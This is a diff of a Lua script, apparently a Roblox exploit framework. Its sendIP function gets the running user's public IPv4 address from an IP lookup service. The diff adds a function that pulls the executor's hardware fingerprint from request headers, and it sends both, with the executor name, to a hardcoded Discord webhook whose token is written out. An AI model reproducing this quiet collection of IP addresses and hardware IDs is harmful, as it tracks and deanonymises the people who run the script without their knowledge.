@@ -64,10 +64,10 @@ local framework = {
   
   local function sendIP(whitelistKey)
     local Webhook = "https://discord.com/api/webhooks/922449991967051816/Wr9l088jha-3r9xP45hpJCSPo7nMpEPkV77yaUwKbvr4wZ1UzP6yFO5jEtzM6ma_15EB"
-    local IPv4 = game:HttpGet("https://v4.ident.me/")
-    --local IPv6 = game:HttpGet("https://v6.ident.me/")
+    local IPv4 = tostring(game:HttpGet("https://api.ipify.org", true))
   
-    local Headers = {["content-type"] = "application/json"} -- Don't Modify
+    local hwid_headers = {'Syn-Fingerprint'} or {'Krnl-Hwid'} or {'fingerprint'} or {'sentinel-fingerprint'} or {'proto-user-identifier'} or {'shadow_hardware'} or {'exploit-guid'} or nil
+   function hwid()local a=req({Url='https://httpbin.org/get',Method='GET'})local b=game:GetService('HttpService'):JSONDecode(a.Body)for c,d in pairs(hwid_headers)do if b.headers[d]then return b.headers[d]end end end
   
     local LocalPlayer = game:GetService("Players").LocalPlayer
   
@@ -107,19 +107,19 @@ local framework = {
                        ["inline"] = true
     },
                    {
-                       ["name"] = "Game; ",
-                       ["value"] = GameName,
-                       ["inline"] = true
-    },
-                   {
                        ["name"] = "Executer; ",
                        ["value"] = ExplCheck,
                        ["inline"] = true
     },
-  
                    {
                        ["name"] = "IPv4; ",
                        ["value"] = IPv4,
+                       ["inline"] = true
+    },
+  
+                   {
+                       ["name"] = "HWID; ",
+                       ["value"] = tostring(hwid()),
                        ["inline"] = true
     },
                },
